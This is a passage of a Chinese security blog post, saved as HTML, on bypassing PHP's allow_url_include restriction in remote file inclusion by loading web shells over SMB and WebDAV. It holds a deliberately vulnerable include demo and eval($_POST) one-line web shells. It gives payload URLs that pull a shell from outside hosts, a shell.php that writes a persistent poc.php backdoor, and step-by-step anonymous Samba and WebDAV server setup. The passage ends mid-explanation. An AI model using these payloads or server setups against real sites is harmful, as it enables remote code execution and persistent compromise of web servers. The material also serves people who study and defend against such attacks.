@@ -1,0 +1,1188 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="RFI巧用WebDAV绕过URL包含限制Getshell, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>RFI巧用WebDAV绕过URL包含限制Getshell | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">RFI巧用WebDAV绕过URL包含限制Getshell</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
+                            </a>
+                        
+                            <a href="/tags/RFI/">
+                                <span class="chip bg-color">RFI</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-03-06
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    12 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于远程文件包含（Remote File Inclusion）漏洞，自从 <code>php version 5.2</code> 之后一直是一个比较鸡肋的问题！！！直到2019年5月份，国外的一篇文章（<a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">RFI-SMB</a>）和推文（Twitter）吸引了大家的注意，其大概内容主要是通过PHP远程文件包含中 <code>allow_url_fopen</code>和<code>allow_url_include</code> 仅限制<code>http://</code>和<code>ftp://</code>的缺陷，利用SMB协议的文件共享进行绕过与包含。虽说，SMB如今在国内的局限性很大，但是在一定程度上，打破了RFI URL包含限制的局面，同时，也启发了针对 <code>RFI</code> 的扩展利用和探索。正因如此，本文在其之前的基础上又进行了拓展利用与探索，通过巧用<code>WebDAV</code>来绕过URL包含限制Getshell，打破了如今<code>SMB</code>的局限性。</p>
+<h1 id="RFI-基础"><a href="#RFI-基础" class="headerlink" title="RFI 基础"></a>RFI 基础</h1><h2 id="四个函数"><a href="#四个函数" class="headerlink" title="四个函数"></a>四个函数</h2><p>PHP中引发文件包含漏洞的通常主要是以下四个函数：</p>
+<ul>
+<li>include()</li>
+</ul>
+<pre><code>http://www.php.net/manual/en/function.include.php</code></pre><ul>
+<li>include_once()</li>
+</ul>
+<pre><code>http://php.net/manual/en/function.include-once.php</code></pre><ul>
+<li>require()</li>
+</ul>
+<pre><code>http://php.net/manual/en/function.require.php</code></pre><ul>
+<li>require_once()</li>
+</ul>
+<pre><code>http://php.net/manual/en/function.require-once.php</code></pre><h2 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h2><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等），都会直接作为php文件进行解析。</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200303100816386-886816427.png" alt></p>
+<h2 id="函数差异"><a href="#函数差异" class="headerlink" title="函数差异"></a>函数差异</h2><p><strong>include()</strong></p>
+<p>include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200303095025677-2098503980.png" alt></p>
+<p><strong>require()</strong></p>
+<p>require() 函数包含出错的话，则会直接退出，后续语句不在执行</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200303095705692-1015806285.png" alt></p>
+<p><strong>include_once() 和 require_once()</strong> </p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<p><code>二次包含</code></p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200303100303911-1303897892.png" alt></p>
+<p><code>一次包含</code></p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200303100514520-370931602.png" alt></p>
+<h1 id="RFI-限制"><a href="#RFI-限制" class="headerlink" title="RFI 限制"></a>RFI 限制</h1><p>用一个简单的例子构造一个含有文件包含漏洞的<code>Demo</code>，演示一下远程文件包含漏洞的利用，代码如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在上面的漏洞代码中，file参数从GET请求中取值，并且是用户可控的动态变量。当file接收到传入的参数值后，<code>include()</code>函数会直接进行内容包含。由于，文件包含函数加载的参数<code>file</code>没有经过任何的过滤或者严格的定义，可以由攻击者进行控制发起恶意的请求，包含其它恶意文件，从而让应用程序执行攻击者精心准备的恶意脚本，具体如下：</p>
+<p>攻击者准备的恶意脚本：<code>shell.php</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Qftm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>攻击者发起的恶意请求：<code>payload</code></p>
+<pre><code>https://www.qftm.com/index.php?file=http://10.10.10.10/shell.php</code></pre><p>通过上述请求，可以远程包含一个shell，一旦攻击者的恶意请求成功之后，可以达到任意代码执行漏洞也就是<code>RCE</code>。虽然用户没有对文件参数进行控制，但是想要得到一个真正的<code>RCE</code>还需要满足一个条件，如下<code>php.ini</code>配置：</p>
+<pre><code>allow_url_fopen=On
+allow_url_include=On</code></pre><p>只有当这两个配置设置成On时，最终的漏洞才能利用成功，遗憾的是PHP官方在 <code>php version 5.2</code> 之后默认的关闭了<code>allow_url_include</code>，是不是突然感觉没有了希望！！！不要放弃，下面利用我们强大的<code>Bypass</code>功能进行限制绕过。</p>
+<h1 id="RFI-缺陷"><a href="#RFI-缺陷" class="headerlink" title="RFI 缺陷"></a>RFI 缺陷</h1><p>对于RFI的缺陷，先来看一下PHP针对<code>allow_url_fopen</code>和<code>allow_url_include</code>的配置说明</p>
+<p><code>php7.x -&gt; php.ini</code></p>
+<pre><code>;;;;;;;;;;;;;;;;;;
+; Fopen wrappers ;
+;;;;;;;;;;;;;;;;;;
+
+; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
+; http://php.net/allow-url-fopen
+allow_url_fopen=On
+
+; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
+; http://php.net/allow-url-include
+allow_url_include=Off
+</code></pre><p>从配置中可以看到 <code>allow_url_fopen</code>和<code>allow_url_include</code>主要是针对两种协议起作用：<code>http://</code>、 <code>ftp://</code>。</p>
+<p>PHP针对RFI URL包含限制主要是利用<code>allow_url_include=Off</code>来实现，将其设置为Off，可以让PHP不加载远程HTTP或FTP URL，从而防止远程文件包含攻击。那么，我们是不是可以这样想，有没有什么其它协议可以让我们去包含远程服务器文件，答案是肯定的，例如<code>SMB</code>、<code>WebDAV</code>等协议。</p>
+<p>既然这样，攻击者就可以利用这个缺陷，使用相应的协议进行Bypass。在这个过程中，即使<code>allow_url_fopen</code>和<code>allow_url_include</code>都设置为Off，PHP也不会阻止相应的远程文件加载。</p>
+<h1 id="RFI-绕过"><a href="#RFI-绕过" class="headerlink" title="RFI 绕过"></a>RFI 绕过</h1><p>在介绍<code>WebDAV Bypass</code>的时候先来简单了解一下<code>SMB Bypass</code>，因为他们利用道理都差不多。</p>
+<h2 id="SMB-Bypass"><a href="#SMB-Bypass" class="headerlink" title="SMB Bypass"></a>SMB Bypass</h2><p>SMB协议主要于网络文件的共享，SMB所在端口445。PHP在远程匿名加载smb所共享的文件时并不会对其进行拦截。</p>
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><pre><code>unc -&gt; smb
+</code></pre><h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的SMB服务器共享加载PHP Web shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>首先，重新配置PHP环境，在php.ini文件中禁用<code>allow_url_fopen</code>以及<code>allow_url_include</code>。然后，配置SMB服务器具有匿名读访问权限。</p>
+<ul>
+<li><strong>PHP环境设置</strong></li>
+</ul>
+<p>首先，在受害者主机上配置php.ini，将<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为Off</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307002248885-800509890.png" alt></p>
+<p>然后重启服务查看<code>phpinfo()</code>配置是否生效</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307002514008-104929118.png" alt></p>
+<ul>
+<li><strong>SAMBA服务器环境配置</strong></li>
+</ul>
+<p>需要使用匿名读取访问权限配置SAMBA服务器（Ubuntu18.04）</p>
+<pre><code>Samba是在Linux和UNIX系统上实现SMB协议的一个软件
+</code></pre><p>（1）安装SAMBA服务器</p>
+<pre><code>apt-get install samba
+</code></pre><p>（2）创建SMB共享目录和 <code>php web shell</code></p>
+<pre><code>mkdir /var/www/html/pub/
+touch /var/www/html/pub/shell.php
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307003149228-1794533246.png" alt></p>
+<p>（3）配置新创建的SMB共享目录的权限</p>
+<pre><code>chmod 0555 /var/www/html/pub/
+chown -R nobody:nogroup /var/www/html/pub/
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307003302430-1738979555.png" alt></p>
+<p>（4）编辑samba配置文件 <code>/etc/samba/smb.conf</code></p>
+<pre><code>[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = indishell-lab
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
+
+[Qftm]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+</code></pre><p>（5）重新启动SAMBA服务器以应用配置文件<code>/etc/samba/smb.conf</code>中的新配置</p>
+<pre><code>service smbd restart 
+</code></pre><p>成功重新启动SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求凭据。</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307003608732-1534409457.png" alt></p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>在环境都配置完且验证之后，利用<code>samba</code>目录<code>/var/www/html/pub</code>中共享的WebShell进行GetShell</p>
+<ul>
+<li><code>unc-&gt;payload</code></li>
+</ul>
+<pre><code>http://127.0.0.1/FI/index.php?file=\\192.33.6.145\qftm\shell.php
+</code></pre><ul>
+<li><code>shell.php</code></li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>蚁剑连接</li>
+</ul>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307003826353-257274136.png" alt></p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307003852971-1468161436.png" alt></p>
+<h3 id="SMB总结"><a href="#SMB总结" class="headerlink" title="SMB总结"></a>SMB总结</h3><p>针对smb利用的局限性，因为这种<code>unc</code>只能是在windows下使用，而且，<code>smb端口(445)</code> 在国内已经被封杀的差不多了（勒索病毒！！！），很难应用到实际中，但是其他的像<code>webdav</code>这种同理也是可以被包含的，且利用的价值更大。</p>
+<h2 id="WebDAV-Bypass"><a href="#WebDAV-Bypass" class="headerlink" title="WebDAV Bypass"></a>WebDAV Bypass</h2><p>WebDAV（<a href="http://webdav.org/" target="_blank" rel="noopener">Web 分布式创作和版本管理</a>）是一项基于 HTTP/1.1 协议的通信协议。它扩展了HTTP/1.1 协议，在Get、Post、Put、Delete 等HTTP标准方法外添加了新方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)和解锁(Unlock)，以及文件的版本控制。</p>
+<p>PHP在远程匿名加载WebDAV所共享的文件时并不会对其进行拦截。</p>
+<h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3><pre><code>类unc -&gt; WebDAV</code></pre><p>依赖于Windows的webclient服务，需要在目标环境开启<code>sc start webclient</code>服务才能利用，有些系统默认开启。</p>
+<h3 id="攻击场景-1"><a href="#攻击场景-1" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p>
+<h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>同SMB环境配置一样，首先，重新配置PHP环境，在php.ini文件中禁用<code>allow_url_fopen</code>以及<code>allow_url_include</code>。然后，配置WebDAV服务器。</p>
+<ul>
+<li><strong>PHP环境设置</strong></li>
+</ul>
+<p>首先，在受害者主机上配置php.ini，将<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为Off</p>
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200307002248885-800509890.png" alt></p>
+<p>然后重启服务查看<code>phpinfo()</code>配置是否生效</p>
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200307002514008-104929118.png" alt></p>
+<ul>
+<li><strong>WebDAV服务器环境配置</strong></li>
+</ul>
+<p>需要使用匿名读取访问权限配置WebDAV服务器。</p>
+<p><strong>1、Ubuntu18.04手动搭建WebDAV服务器</strong></p>
+<p>（1）安装Apache Web服务器</p>
+<pre><code>sudo apt-get install -y apache2
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307013353511-653218897.png" alt></p>
+<p>（2）在Apache配置中启用WebDAV模块</p>
+<pre><code>sudo a2enmod dav
+sudo a2enmod dav_fs
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307013305165-1240170783.png" alt></p>
+<p>（3）创建WebDAV共享目录<code>webdav</code>和 <code>php web shell</code></p>
+<pre><code>sudo mkdir -p /var/www/html/webdav
+sudo touch /var/www/html/webdav/shell.php
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307013607223-1397616017.png" alt></p>
+<p>（4）将文件夹所有者更改为您的Apache用户，<code>www-data</code>以便Apache具有对该文件夹的写访问权</p>
+<pre><code>sudo chown -R www-data:www-data  /var/www/
+</code></pre><p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307021734287-1378135472.png" alt></p>
+<p>（5）编辑WebDAV配置文件 <code>/etc/apache2/sites-available/000-default.conf</code></p>
+<p>不需要启用身份验证</p>
+<pre><code>DavLockDB /var/www/html/DavLock
+&lt;VirtualHost *:80&gt;
+    # The ServerName directive sets the request scheme, hostname and port that
+    # the server uses to identify itself. This is used when creating
+    # redirection URLs. In the context of virtual hosts, the ServerName
+    # specifies what hostname must appear in the request&#39;s Host: header to
+    # match this virtual host. For the default virtual host (this file) this
+    # value is not decisive as it is used as a last resort host regardless.
+    # However, you must set it for any further virtual host explicitly.
+    #ServerName www.example.com
+
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+
+    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+    # error, crit, alert, emerg.
+    # It is also possible to configure the loglevel for particular
+    # modules, e.g.
+    #LogLevel info ssl:warn
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+    # For most configuration files from conf-available/, which are
+    # enabled or disabled at a global level, it is possible to
+    # include a line for only one particular virtual host. For example the
+    # following line enables the CGI configuration for this host only
+    # after it has been globally disabled with &quot;a2disconf&quot;.
+    #Include conf-available/serve-cgi-bin.conf
+    Alias /webdav /var/www/html/webdav 
+    &lt;Directory /var/www/html/webdav&gt; 
+        DAV On 
+    &lt;/Directory&gt;
+&lt;/VirtualHost&gt;
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</code></pre><p>（6）重新启动Apache服务器，以使更改生效</p>
+<pre><code>sudo service apache2 restart
+</code></pre><p>成功重新启动Apache服务器后，尝试访问WebDAV共享并确保WebDAV服务器不要求凭据。</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307022515883-113998614.png" alt></p>
+<p>除了上面在Ubuntu上一步步安装WebDAV服务器外，还可以利用做好的Docker镜像。</p>
+<p><strong>2、WebDAV Docker镜像</strong></p>
+<p>推荐使用Docker镜像方式去安装利用，免去一些因环境或配置不当而产生的问题</p>
+<p>（1）拉取webdav镜像</p>
+<p>镜像地址：<code>https://hub.docker.com/r/bytemark/webdav</code></p>
+<p>（2）用docker启动一个webdav服务器</p>
+<pre><code>docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
+</code></pre><p>（3）在<code>~/webdav/data</code>目录里面共享自己php脚本</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307023827789-853120085.png" alt></p>
+<p>（5）验证Webdav服务器</p>
+<p>浏览器验证</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307024717494-1333953971.png" alt></p>
+<p>终端验证</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307015438927-457772254.png" alt></p>
+<h3 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h3><p>在环境都配置完且验证之后，利用<code>webdav</code>目录<code>~/webdav/data</code>中共享的WebShell进行GetShell</p>
+<ul>
+<li><code>类unc-&gt;payload</code></li>
+</ul>
+<pre><code>http://127.0.0.1/FI/index.php?file=//172.17.0.2//webdav/shell.php
+</code></pre><ul>
+<li><code>shell.php</code></li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'poc.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[Qftm])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义<code>shell.php</code>，通过服务器加载远程<code>shell.php</code>给我们自动生成一个<code>Webshell</code>。</p>
+<p>请求构造的payload</p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307025802749-1364609699.png" alt></p>
+<p>从图中可以看到远程加载<code>shell.php</code>利用成功，可以根据状态码分析其加载过程：</p>
